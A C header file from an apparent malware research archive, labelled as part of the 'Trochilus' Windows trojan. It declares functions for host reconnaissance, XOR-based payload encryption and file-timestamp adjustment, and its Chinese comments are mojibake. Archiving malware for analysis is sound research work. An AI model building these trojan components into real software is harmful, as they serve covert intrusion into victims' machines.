/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include <Wtsapi32.h>
#include "tstring.h"


//����ϵͳ��ʶ ö������
typedef enum WIN_VER_DETAIL {
	WINDOWS_VERSION_NONE = 0,   // 0
	WINDOWS_VERSION_95,			// 1
	WINDOWS_VERSION_95_OSR2,	// 2
	WINDOWS_VERSION_98,			// 3
	WINDOWS_VERSION_98_SE,		// 4
	WINDOWS_VERSION_ME,			// 5
	WINDOWS_VERSION_NT,			// 6
	WINDOWS_VERSION_2K,			// 7
	WINDOWS_VERSION_XP,			// 8
	WINDOWS_VERSION_2K3,		// 9
	WINDOWS_VERSION_2K3_SP1_SP2,// 10
	WINDOWS_VERSION_VISTA,		// 11
	WINDOWS_VERSION_7,			// 12
	WINDOWS_VERSION_2K8,		// 13
	WINDOWS_VERSION_8,			// 14
	WINDOWS_VERSION_2012,		// 15
} WIN_VER_DETAIL;

//�û��Ự��Ϣ
typedef struct 
{  
	DWORD	sessionId;
	tstring	username;
	tstring	winStationName;
	WTS_CONNECTSTATE_CLASS state;
} MY_SESSION_INFO;
typedef std::vector<MY_SESSION_INFO> SessionInfoList;

//���ӽ���
void XorFibonacciCrypt(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1);

//��ȡ�����û�
LPCTSTR GetProcessUserName(DWORD dwID);

//��ȡ����ϵͳ�汾
WIN_VER_DETAIL GetWindowsVersion();

//��ȡ����ϵͳ�汾��
std::wstring GetSystemVersionCode();

//��ȡ����ϵͳƽ̨
BOOL IsWow64();

//��ȡ����IP�б�
BOOL GetLocalIPList(TStringVector& localIPList);

//��ѯ�����û���
//BOOL GetProcessUsername(DWORD dwProcessID, tstring& username);

//��ȡ���ص�¼�û���
BOOL GetLogonUserList(SessionInfoList& sessionList);

//��ȡ��ǰ�����Ƿ��ǹ���ԱȨ��
BOOL IsAdministrator();
/*
//byteת��Ϊhex
void Byte2HEX(const LPBYTE pByteList, DWORD dwLength, tstring& hexString);

//����md5
void GetMD5(LPCVOID lpMem, DWORD dwSize, tstring& md5String);
*/


LPCTSTR GetBinFilepath();

void GetModFilePath(HMODULE hMod, tstring& binFilePath, tstring& filename);

BOOL XFC( const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1 );

BOOL AdjustTimes( LPCTSTR filepath );